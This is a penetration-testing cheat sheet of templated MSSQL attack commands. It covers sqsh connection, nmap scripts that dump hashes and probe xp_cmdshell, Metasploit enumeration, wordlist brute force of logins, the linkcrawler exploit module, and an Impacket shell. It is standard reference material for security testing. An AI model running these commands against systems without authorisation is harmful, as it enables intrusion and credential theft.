# MSSQL

## connect

### sqsh

Connect to MSSQL with sqsh.

```sh title:"Connect to MSSQL with sqsh"
sqsh -S "$rhost_ip:$rport" -U "$user" -P "$pass"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user
var pass
-->

## recon

### Nmap enum

Run MSSQL nmap enumeration scripts with optional SQL credentials.

```sh title:"Run MSSQL nmap enumeration scripts"
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args "mssql.instance-port=$rport,mssql.username=$user,mssql.password=$pass,mssql.instance-name=$instance_name" -sV -p "$rport" "$rhost_ip"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user := sa
var pass
var instance_name := MSSQLSERVER
-->

### Metasploit enum

Enumerate MSSQL configuration with Metasploit.

```sh title:"Enumerate MSSQL configuration with Metasploit"
msfconsole -x "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $rhost_ip; set RPORT $rport; set USERNAME $user; set PASSWORD $pass; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user
var pass
-->

## brute force

### SQL logins

Enumerate MSSQL logins with Metasploit and wordlists.

```sh title:"Enumerate MSSQL logins with Metasploit"
msfconsole -x "use admin/mssql/mssql_enum_sql_logins; set RHOSTS $rhost_ip; set RPORT $rport; set USER_FILE $user_file; set PASS_FILE $pass_file; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user_file
var pass_file
-->

## linked servers

### Link crawler

Run Metasploit MSSQL link crawler.

```sh title:"Run MSSQL link crawler"
msfconsole -x "use exploit/windows/mssql/mssql_linkcrawler; set RHOSTS $rhost_ip; set RPORT $rport; set USERNAME $user; set PASSWORD $pass; run; exit"
```
<!-- cheat
var rhost_ip
var rport := 1433
var user
var pass
-->

## shell

### Impacket Windows auth

Open an interactive MSSQL shell with Windows authentication.

```sh title:"Open MSSQL shell with Impacket mssqlclient"
mssqlclient.py -windows-auth "$auth_target" $auth_flags
```
<!-- cheat
import domain_ip
import users
import impacket_auth
-->
